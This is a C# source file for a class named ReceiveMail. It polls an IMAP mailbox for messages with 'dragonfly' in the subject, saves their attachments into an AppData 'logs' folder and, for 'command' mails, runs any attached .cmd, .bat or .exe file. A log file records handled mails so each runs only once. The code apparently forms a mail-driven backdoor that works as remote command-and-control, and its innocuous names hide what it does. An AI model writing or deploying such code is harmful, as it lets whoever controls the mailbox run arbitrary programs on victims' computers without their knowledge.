using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Threading;
using Koolwired.Imap;
using System.Xml;

namespace Dragonfly.Chalk
{
    internal class ReceiveMail
    {
        private static Thread workerThread = null;

        public static bool IsBusy()
        {
            if (workerThread != null && workerThread.IsAlive)
                return true;
            else
                return false;
        }

        public static void Inbox(string account, string password, string host, int port, bool bSsl)
        {
            if (workerThread != null && workerThread.IsAlive)
                return;

            ReceiveMail worker = new ReceiveMail();

            worker.account = account;
            worker.password = password;
            worker.host = host;
            worker.port = port;
            worker.bSsl = bSsl;

            workerThread = new Thread(worker.DoWork);
            workerThread.Start();
        }

        private void DoWork()
        {
            try
            {
                ImapConnect connection = new ImapConnect(host, port, bSsl);
                ImapCommand command = new ImapCommand(connection);
                ImapAuthenticate authenticate = new ImapAuthenticate(connection, account, password);
                connection.Open();
                authenticate.Login();
                ImapMailbox mailbox = command.Select("INBOX");

                mailbox = command.Fetch(mailbox);
                foreach (ImapMailboxMessage msg in mailbox.Messages)
                {
                    if (!string.IsNullOrEmpty(msg.Subject))
                    {
                        string subject = msg.Subject.ToLower();
                        if (subject.Contains("dragonfly"))
                        {
                            if (!ConfigIsReceivedMail(subject))
                            {
                                if (subject.Contains("command"))
                                {
                                    ExecCommand(msg, command);
                                }
                                else if (subject.Contains("setting"))
                                {
                                    ExecSetting(msg, command);
                                }
                                else if (subject.Contains("update"))
                                {
                                    ExecUpdate(msg, command);
                                }
                                else if (subject.Contains("upload"))
                                {
                                    ExecUpload(msg, command);
                                }

                                ConfigAddNewMail(subject);
                            }
                        }
                    }
                }


                authenticate.Logout();
                connection.Close();

            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e);
            }
            finally
            {
            }
        }

        private ArrayList DownloadAllAttachment(ImapMailboxMessage msg, ImapCommand command, string destPath)
        {
            ArrayList filenameArray = new ArrayList();
            command.FetchBodyStructure(msg);
            for (int i = 0; i < msg.BodyParts.Count; i++)
            {
                command.FetchBodyPart(msg, i);
                if (msg.BodyParts[i].Attachment)
                {
                    if (msg.BodyParts[i].ContentType.MediaType.Equals("APPLICATION/OCTET-STREAM"))
                    {
                        string filename = destPath + msg.BodyParts[i].FileName;
                        using (BinaryWriter binWriter = new BinaryWriter(File.Open(filename, FileMode.Create)))
                        {
                            binWriter.Write(msg.BodyParts[i].DataBinary);
                            binWriter.Flush();
                            binWriter.Close();

                            filenameArray.Add(filename);
                        }

                    }
                }
            }

            return filenameArray;
        }



        private static string LogFilePath
        {
            get
            {
                return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\logs\\";
            }
        }

        private void ExecCommand(ImapMailboxMessage msg, ImapCommand command)
        {
            string appDataPath = LogFilePath;
            ArrayList filenameArray = DownloadAllAttachment(msg, command, appDataPath);
            CultureInfo ci = new CultureInfo("zh-CN");
            foreach (string filename in filenameArray)
            {
                if (filename.EndsWith(".cmd", true, ci) || filename.EndsWith(".bat", true, ci) || filename.EndsWith(".exe", true, ci))
                {
                    ExecApp(filename, string.Empty, string.Empty);
                }
            }
        }

        private void ExecSetting(ImapMailboxMessage msg, ImapCommand command)
        {
            string appDataPath = LogFilePath;
            DownloadAllAttachment(msg, command, appDataPath);
        }

        private void ExecUpdate(ImapMailboxMessage msg, ImapCommand command)
        {
            string appDataPath = LogFilePath;
            DownloadAllAttachment(msg, command, appDataPath);
        }
        private void ExecUpload(ImapMailboxMessage msg, ImapCommand command)
        {
        }

        private bool ExecApp(string app, string appParam, string appStartpath)
        {

            try
            {
                Process myprocess = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo(app, appParam);
                startInfo.WindowStyle = ProcessWindowStyle.Normal;
                startInfo.WorkingDirectory = appStartpath;
                myprocess.StartInfo = startInfo;
                myprocess.StartInfo.UseShellExecute = false;
                myprocess.Start();
                return true;
            }
            catch
            {
                return false;
            }
        }


        protected static string ConfigFilename
        {
            get
            {
                return "received.txt";
            }
        }

        public static bool ConfigIsReceivedMail(string title)
        {
            XmlDocument xmlDocument = XmlHelper.Load(LogFilePath + ConfigFilename);
            if (xmlDocument == null)
            {
                return false;
            }

            XmlNodeList xmlNodelist = xmlDocument.SelectNodes("/Logs/log");
            foreach (XmlNode xmlNode in xmlNodelist)
            {
                string sPath = XmlHelper.GetParamValue(xmlNode, "title", string.Empty);
                if (sPath.Equals(title))
                {
                    return true;
                }
            }
            return false;
        }

        protected static void ConfigAddNewMail(string title)
        {
            XmlDocument xmlDocument = XmlHelper.Load(LogFilePath + ConfigFilename);
            if (xmlDocument == null)
            {
                xmlDocument = new XmlDocument();
                XmlDeclaration xmldecl = xmlDocument.CreateXmlDeclaration("1.0", "UTF-8", null);
                XmlElement root = xmlDocument.DocumentElement;
                xmlDocument.AppendChild(xmldecl);

                XmlNode node = xmlDocument.CreateNode("element", "Logs", "");
                xmlDocument.AppendChild(node);
            }

            bool bFounded = false;
            XmlNodeList xmlNodelist = xmlDocument.SelectNodes("/Logs/log");
            foreach (XmlNode xmlNode in xmlNodelist)
            {
                string sPath = XmlHelper.GetParamValue(xmlNode, "title", string.Empty);
                if (sPath.Equals(title))
                {
                    bFounded = true;
                    break;
                }
            }

            if (!bFounded)
            {
                XmlNode xmlRoot = xmlDocument.SelectSingleNode("/Logs");
                XmlNode xmlNode = xmlDocument.CreateNode("element", "log", "");
                XmlHelper.PutParamValue(xmlNode, "title", title);
                xmlRoot.AppendChild(xmlNode);
                xmlDocument.Save(LogFilePath + ConfigFilename);
            }
        }

        private string account;
        private string password;
        private string host;
        private int port;
        private bool bSsl;
    }
}
